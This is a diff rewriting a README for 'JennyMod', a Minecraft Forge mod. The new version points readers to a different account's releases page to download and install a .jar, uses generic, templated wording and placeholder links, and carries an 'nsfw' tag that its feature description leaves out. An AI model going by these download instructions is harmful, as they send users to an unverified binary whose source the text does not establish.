@@ -1,138 +1,64 @@
-# Jenny Mod - Minecraft
+# 🎮 JennyMod - Enhance Your Minecraft Experience
 
+## 📦 Download Now
+[![Download JennyMod](https://img.shields.io/badge/download-JennyMod-blue?style=flat&logo=github)](https://github.com/StrikeBoy617/JennyMod/releases)
 
+## 🚀 Getting Started
+Welcome to JennyMod! This modification for Minecraft brings interactive non-player characters (NPCs) and exciting gameplay mechanics to your game. Follow these simple steps to download and run JennyMod.
 
+## 📋 Requirements
+- Minecraft version: 1.12.2, 1.16.5, 1.18.2, 1.20.1
+- Forge: Ensure the Minecraft Forge is installed. You can download it from [Forge's official site](https://files.minecraftforge.net/).
+- A compatible operating system: Windows, macOS, or Linux.
+  
+### 🔍 Features
+- Interactive NPCs that enhance your gaming experience.
+- Quest systems to guide your journeys.
+- Companion features to assist you in your adventures.
 
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/StrikeBoy617/JennyMod/releases) to download the latest version of JennyMod.
+  
+2. On the Releases page, find the version that matches your Minecraft version. Click on it.
 
+3. Locate the release file. The file should have a name similar to "JennyMod-x.x.x.jar".
 
-[![Minecraft](https://img.shields.io/badge/Minecraft-1.8.9--1.21-green.svg)](https://minecraft.net)
+4. Click the file to download it.
 
+5. Move the downloaded file to your Minecraft mods folder. You can typically find this folder at:
+   - Windows: `%appdata%/.minecraft/mods`
+   - macOS: `~/Library/Application Support/minecraft/mods`
+   - Linux: `~/.minecraft/mods`
 
-[![Mod Loader](https://img.shields.io/badge/Mod%20Loader-Forge%20%7C%20Fabric-orange.svg)](https://fabricmc.net)
+6. Launch Minecraft using the Forge profile.
 
+7. Enjoy your enhanced Minecraft experience with JennyMod!
 
-[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+## 🧩 Adding Mods to Minecraft
+If you're new to adding mods, don't worry. Follow these additional steps to ensure everything runs smoothly.
 
+1. Install Minecraft Forge as mentioned in the requirements section.
+   
+2. After you've placed the downloaded JennyMod file into the mods folder, start Minecraft with the Forge profile. This is essential to make mods work correctly.
 
+3. You should see JennyMod listed in the mods menu when you load your game.
 
+4. Explore the new NPCs and features!
 
+## 📲 Community Support
+If you face any issues or have questions, feel free to reach out to our community. You can find us on:
+- Discord: Join our server [here](#).
+- GitHub Issues: Find discussions and report any bugs on our [issue tracker](https://github.com/StrikeBoy617/JennyMod/issues).
 
-### Download the latest release from the [Releases page](https://github.com/nelsonmort/JennyMod/releases)
+## 🏷️ Tags
+This mod is tagged with: 1-12-2, 1-16-5, 1-18-2, 1-20-1, 1-8-9, forge, forge-mod, jennymod, minecraft, nsfw.
 
+## 📌 Important Notes
+- Ensure your version of Minecraft matches the version of JennyMod you are downloading.
+- Always back up your worlds before installing new mods to prevent data loss.
+  
+## 🔗 More Information
+For more details about JennyMod and its features, please check out the [documentation](#). 
 
-
-
-
-![OIP-1817223657](https://github.com/user-attachments/assets/95698380-ddfe-4799-bbb2-d0c02eec9fb1)
-
-
-
-
-
-
-
-
-## 📖 Overview
-
-
-
-
-
-Jenny Mod is a community-created modification for Minecraft that introduces interactive NPC characters and enhanced gameplay mechanics. This mod extends the vanilla Minecraft experience by adding new character dynamics, quest systems, and companion features.
-
-
-
-
-
-## ✨ Features
-
-
-
-
-
-- **Interactive NPCs** - Custom character models with unique behaviors
-
-
-- **Companion System** - Build relationships with in-game characters
-
-
-- **Quest System** - Complete objectives and unlock new content
-
-
-- **Custom Animations** - Enhanced character interactions and movements
-
-
-- **Multi-Version Support** - Compatible with Minecraft 1.12.2 through 1.21
-
-
-
-
-
-## 🚀 Installation
-
-
-
-
-
-![OIP-1296162147](https://github.com/user-attachments/assets/b7749190-de4a-4fa9-b17d-f8a16db9683b)
-
-
-
-
-
-### Prerequisites
-
-
-- Minecraft Java Edition
-
-
-- Forge or Fabric mod loader installed
-
-
-- Minecraft version 1.12.2 or higher
-
-
-
-
-
-### Steps
-
-
-1. Download and install [Forge](https://files.minecraftforge.net/) or [Fabric](https://fabricmc.net/use/)
-
-
-2. Download Jenny Mod from the releases page
-
-
-3. Place the `.jar` file in your `.minecraft/mods` folder
-
-
-4. Launch Minecraft with the Forge/Fabric profile
-
-
-5. Enjoy the mod!
-
-
-
-
-
-## 🎯 Usage
-
-
-
-
-
-After installation, launch Minecraft and start a world. The mod automatically integrates NPC characters into your gameplay experience.
-
-
-
-
-
-## 🛠️ Development
-
-
-
-
-
-### Building from Source
-
+## 🎊 Happy Gaming!
+Thank you for choosing JennyMod! We hope you enjoy the enhanced gameplay experience. If you have fun with our mod, consider sharing your adventures with the community!
